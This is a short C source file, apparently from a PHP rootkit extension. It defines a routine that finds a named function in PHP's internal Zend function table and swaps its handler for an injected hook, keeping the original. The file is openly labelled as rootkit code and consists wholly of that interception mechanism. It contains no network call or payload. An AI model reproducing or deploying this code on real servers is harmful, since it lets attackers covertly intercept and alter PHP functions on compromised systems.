#include "php.h"

#include "rootkit_config.h"

bool rootkit_hook_function(
	const char* method_name,
	void (*hook)(INTERNAL_FUNCTION_PARAMETERS),
	void (**original)(INTERNAL_FUNCTION_PARAMETERS)
) {

	zend_function *function;

	if (!hook || !original) {
		ROOTKIT_PRINTF("Unable to apply hook, no hook address / original address holder provided!\n");
		return false;
	}

	
	if ((function = zend_hash_str_find_ptr(CG(function_table), method_name, strlen(method_name))) != NULL) {
		*original = function->internal_function.handler;
		function->internal_function.handler = *hook;
		ROOTKIT_PRINTF("Successfully hooked function '%s' (original: %p) -> (hook: %p)\n", method_name, &original, &hook);
		return true;
	} else {
		ROOTKIT_PRINTF("Unable to locate function '%s' in global function table.\n", method_name);
		return false;
	}
}
